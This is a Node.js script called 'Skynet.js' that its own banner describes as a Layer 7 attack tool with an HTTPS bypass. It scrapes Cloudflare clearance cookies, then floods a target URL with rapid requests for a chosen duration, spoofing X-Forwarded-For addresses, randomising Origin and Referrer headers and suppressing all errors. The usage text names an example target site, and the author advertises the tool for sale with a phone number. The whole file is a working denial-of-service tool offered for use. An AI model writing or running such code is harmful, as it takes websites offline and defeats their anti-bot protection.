var cloudscraper = require('cloudscraper');
var request=require('request');
var randomstring = require("randomstring");
const gradient = require("gradient-string");
const moment = require("moment");
var args = process.argv.slice(2);
randomByte = function() {
    return Math.round(Math.random()*256);
}
if (process.argv.length <= 2) {
	console.clear();
	console.log ("");
	console.log (gradient.teen(`
	
	 ┌────────────────────────────────────┐
	 │  .▄▄ · ▄ •▄  ▄· ▄▌ ▐ ▄ ▄▄▄ .▄▄▄▄▄  │
	 │  ▐█ ▀. █▌▄▌▪▐█▪██▌•█▌▐█▀▄.▀·•██    │
	 │  ▄▀▀▀█▄▐▀▀▄·▐█▌▐█▪▐█▐▐▌▐▀▀▪▄ ▐█.▪  │
	 │  ▐█▄▪▐█▐█.█▌ ▐█▀·.██▐█▌▐█▄▄▌ ▐█▌·  │
	 │   ▀▀▀▀ ·▀  ▀  ▀ • ▀▀ █▪ ▀▀▀  ▀▀▀   │
	 └─────┬───────────────────────┬──────┘
	
	`));
    console.log(gradient.teen("[SKYNET] > node Skynet.js [URL] [TIME]"));
	console.log(gradient.teen("[SKYNET] > example Skynet.js [https://panel.scrlndstore.id/] [300]"));
    console.log(gradient.teen("[SKYNET] > Skynet.js are Layer7 Attacks using HTTPS-BYPASS was Created by Ibaaall."));
	console.log("");
	console.log(gradient.teen("[SKYNET] > If you want buy you can contact me at Whatsapp!"));
	console.log(gradient.teen("[SKYNET] > My Number: 0811-738-7381"));
    process.exit(-1);
}
var url = process.argv[2];
var time = process.argv[3];
setInterval
var int = setInterval(() => {
    
    var cookie = '';
    var useragent = '';
    cloudscraper.get(url, function(error, response, body) {
        if (error) {
            console.log(gradient.teen(`[SKYNET] > Connection Timedout!`));
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
        }
        // console.log(cookie + '/' + useragent)
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
          });
            var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
            randomByte();
            const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
            };
			console.log(gradient.teen("[SKYNET] > Success attack to " + url + " | Duration: " + time + "!"));
            function callback(error, response, body) {
            }
            request(options);
    });    
});
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function(err) {
    
});
process.on('unhandledRejection', function(err) {
    
});
